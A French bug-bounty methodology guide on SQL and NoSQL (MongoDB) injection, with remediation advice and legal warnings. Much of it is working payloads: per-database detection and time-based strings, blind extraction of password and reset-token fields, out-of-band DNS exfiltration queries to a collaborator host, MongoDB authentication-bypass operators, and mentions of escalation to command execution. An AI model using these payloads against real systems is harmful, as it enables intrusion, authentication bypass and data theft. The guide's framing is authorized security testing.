# SQL & NoSQL Injection (2024-2026)

## Contexte

Le SQLi classique décline en fréquence sur les cibles matures qui utilisent des ORM (Prisma, Sequelize, Hibernate, SQLAlchemy), mais reste fréquent dans : les query builders custom, les paramètres de tri/filtre dynamiques (`?sort=`, `?orderBy=`), les rapports/exports, les intégrations legacy, et surtout les **NoSQL injections** (MongoDB) sous-testées par la plupart des hunters.

## Comment tester — SQLi classique

### Détection

```
1. Injecter des canaris sur TOUS les paramètres, pas seulement les champs de recherche évidents :
   - Paramètres GET/POST classiques
   - Headers (X-Forwarded-For, User-Agent, Referer — souvent loggés en DB sans sanitization)
   - Cookies
   - Champs JSON imbriqués dans le body
2. Payloads de détection différentielle :
   ' AND '1'='1   vs   ' AND '1'='2
3. Observer : erreur SQL verbeuse, différence de contenu, différence de code HTTP, différence de timing.
```

**Payloads de détection par contexte de DB :**

```sql
-- Générique
' OR '1'='1
' OR SLEEP(5)-- -
' AND 1=CONVERT(int, (SELECT @@version))--

-- MySQL
' UNION SELECT 1,2,3-- -
' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -

-- PostgreSQL
'; SELECT pg_sleep(5)--
' AND 1=CAST((SELECT version()) AS int)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
' AND 1=CONVERT(int, @@version)--

-- Oracle
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
```

### Blind & Time-based

```sql
-- Boolean-based blind
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -

-- Time-based blind (quand aucune différence visible sauf le temps)
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)-- -
```

> 💡 **Pro tip :** Automatise l'extraction blind avec `sqlmap --technique=BT --risk=1 --level=3` d'abord en mode conservateur, puis augmente le risque/level uniquement si le WAF ne bloque pas — un `sqlmap` bruyant en risk=5 sur un WAF actif = ban IP immédiat et zéro résultat utile.

### Out-of-Band (OOB) — quand blind ne suffit pas

```sql
-- MSSQL via xp_dirtree (DNS exfiltration)
'; EXEC master..xp_dirtree '\\CANARY.burpcollaborator.net\a'--

-- Oracle via UTL_HTTP / UTL_INADDR
' AND 1=(SELECT UTL_INADDR.get_host_address('CANARY.burpcollaborator.net') FROM dual)--

-- PostgreSQL via requêtes DNS custom (extensions)
```
Utilise Burp Collaborator ou un serveur DNS/HTTP contrôlé pour confirmer l'exécution sans dépendre du timing.

## NoSQL Injection (MongoDB) — sous-exploité, fort ROI

### Détection

```javascript
// Bypass d'authentification classique — payload JSON
{"username": "admin", "password": {"$ne": null}}
{"username": {"$ne": null}, "password": {"$ne": null}}

// Si le champ est parsé depuis une query string plutôt que du JSON strict :
?username[$ne]=null&password[$ne]=null

// Injection dans un opérateur $where (exécution JS côté serveur — équivalent SQLi/RCE)
{"$where": "this.password.match(/^a/)"}
```

> 💡 **Pro tip d'élite :** Beaucoup de backends Node/Express avec `express-mongo-sanitize` mal configuré ne filtrent que le body JSON — teste systématiquement l'injection d'opérateurs Mongo via **query string** (`?field[$gt]=`) et via **headers**, les développeurs oublient souvent ces vecteurs.

### Extraction de données via NoSQLi (blind boolean)

```javascript
// Extraction caractère par caractère d'un champ (ex: reset token, password hash)
{"resetToken": {"$regex": "^a"}}
{"resetToken": {"$regex": "^ab"}}
// Répéter en itérant sur l'alphabet — automatisable avec un script Python
```

## GraphQL Injection (voir aussi 04-API-GraphQL-Hunting)

Les resolvers GraphQL qui passent des arguments directement à des requêtes SQL/Mongo brutes sont vulnérables de la même façon — teste les arguments de mutation/query comme n'importe quel paramètre.

## Comment confirmer l'impact

- **Extraction de données sensibles réelles** (mais minimal — un `SELECT version()` ou `SELECT current_user` suffit à prouver l'accès sans exfiltrer massivement des PII).
- **Bypass d'authentification** démontré sur un compte de test créé pour l'occasion.
- **Escalade vers RCE** si le SGBD le permet (MSSQL `xp_cmdshell`, PostgreSQL `COPY ... TO PROGRAM`, MySQL `SELECT ... INTO OUTFILE` avec write access) — à ne tenter QUE si explicitement autorisé par le scope, car c'est une action à fort impact destructeur potentiel.

> ⚠️ **Attention légale :** N'extrais jamais plus de données que nécessaire pour la preuve. Une extraction massive de la table `users` dépasse le cadre de la preuve de concept et peut être requalifiée en incident de sécurité réel plutôt qu'en recherche autorisée.

## Remédiation

- Requêtes paramétrées / prepared statements exclusivement.
- ORM avec échappement automatique, jamais de concatenation de chaînes SQL brute.
- Pour NoSQL : validation stricte de schéma (whitelist de types attendus), désactivation de `$where`, sanitization des clés `$`.

## Références

- PortSwigger Web Security Academy — SQL injection, NoSQL injection
- OWASP SQL Injection Prevention Cheat Sheet
- `sqlmap` documentation officielle
- HackTricks — NoSQL Injection
